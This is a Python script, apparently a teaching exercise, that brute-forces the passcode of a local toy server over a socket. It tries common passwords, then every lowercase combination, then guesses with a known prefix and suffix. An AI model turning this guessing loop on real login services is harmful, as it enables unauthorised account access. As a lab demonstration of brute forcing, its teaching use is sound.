import itertools
import socket
import string


class PasswordGenerator:
    def __init__(self, maxlength: int = 9, charset: str = string.ascii_lowercase):
        self.maxlength = maxlength
        self.charset = charset
        pass

    def __iter__(self):
        for password_length in range(1, self.maxlength):
            for guess in itertools.product(self.charset, repeat=password_length):
                guess = ''.join(guess)
                yield guess
        raise StopIteration


HOST = 'localhost'
PORT = 13337
MSG_SIZE = 1024

ALPHANUM = '0123456789'
ALPHALOWER = 'abcdefghijklmnopqrstuvwxyz'
ALPHACAP = ALPHALOWER.upper()


def send_passcode(sock: socket.socket, password: str) -> str:
    sock.sendall(bytes(password, 'ASCII'))
    data = sock.recv(MSG_SIZE)
    return data.decode()


def password_correct(response: str) -> bool:
    return 'Success' in response


def no_fuzzing(sock: socket.socket):
    """ This method shows you what manual fuzzing/bruteforcing would look like..."""

    response = send_passcode(sock, "password123")
    if password_correct(response):
        print("We got a bitcoin!")
        print(response)
        exit(0)
    else:
        print("Wrong password...")
        print("Response from server:")
        print(response)

    response = send_passcode(sock, "admin123")
    if password_correct(response):
        print("We got a bitcoin!")
        print(response)
        exit(0)
    else:
        print("Wrong password...")
        print("Response from server:")
        print(response)

    '''...etc...'''


def bruteforcing(sock: socket.socket):

    pg = PasswordGenerator()

    tries = 0
    for password in pg:

        if(tries % 10000) == 0: # print every 'n'
            print("Trying " + password + "...")

        response = send_passcode(sock, password)
        if password_correct(response):
            print(f"Correct password {password}!")
            print(f"Took {tries} tries!")
            print(response)
            break

        tries+=1


def fuzzing_part_of_pass(sock: socket.socket):
    """Suppose your friend at the NSA has tipped you off to the fact that the password starts with 'c' and ends with 's'..."""
    prepend= 'c'
    append='s'

    pg = PasswordGenerator()

    tries = 0
    for password in pg:

        password = prepend+password+append

        # if(tries % 10000) == 0: # print every 'n'
        print("Trying " + password + "...")

        response = send_passcode(sock, password)
        if password_correct(response):
            print(f"Correct password {password}!")
            print(f"Took {tries} tries!")
            print(response)
            break

        tries += 1





if __name__ == "__main__":
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', PORT))

    print("Uncomment below lines to see how each method of cracking the secret NSA server works.")

    # no_fuzzing(s) # manual process is a pain in the butt

    # bruteforcing(s)  # this is just plain brute forcing, takes about 1,688,000 tries...

    # fuzzing_part_of_pass(s) # takes about 12,000 tries if we just fuzz the middle 3

    s.close()
